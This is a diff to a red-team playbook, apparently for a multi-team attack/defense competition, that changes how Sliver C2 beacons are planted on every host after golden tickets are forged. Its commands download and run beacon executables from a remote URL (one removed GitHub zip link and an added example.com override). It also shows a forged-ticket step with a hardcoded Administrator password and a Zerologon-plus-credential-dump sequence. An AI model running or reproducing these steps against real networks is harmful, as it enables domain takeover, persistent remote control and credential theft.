@@ -30,16 +30,19 @@ forgegold <T> Administrator:NewPassword123
 
 ## Phase 2 — Plant C2 on Every Server
 
-Use the golden tickets to plant Sliver beacons on all hosts across all teams. The zip URL auto-downloads, extracts, and runs every .exe inside.
+Use the golden tickets to plant Sliver beacons on all hosts across all teams. Planter defaults to the standard C2 URL automatically when no local .exe files are present.
 
 ```bash
-# All hosts for one team (uses golden ticket automatically)
-planter <T> -w https://github.com/hyper-lang/sliver-binaries/raw/refs/heads/main/patch.zip
+# All hosts for one team (uses golden ticket + default C2 URL automatically)
+planter <T>
 
 # All teams, one after another
 for t in 1 2 3 4 5; do
-  planter $t -w https://github.com/hyper-lang/sliver-binaries/raw/refs/heads/main/patch.zip
+  planter $t
 done
+
+# Override with a custom URL if needed
+planter <T> -w https://example.com/custom_beacon.exe
 ```
 
 Or from inside a team's use-script, use the `c) Plant C2` menu option:
@@ -285,7 +288,7 @@ T=5  # ← set team number
 forgegold $T
 
 # 2. Plant C2
-planter $T -w https://github.com/hyper-lang/sliver-binaries/raw/refs/heads/main/patch.zip
+planter $T
 
 # 3. Zerologon + dump
 zero -d $T
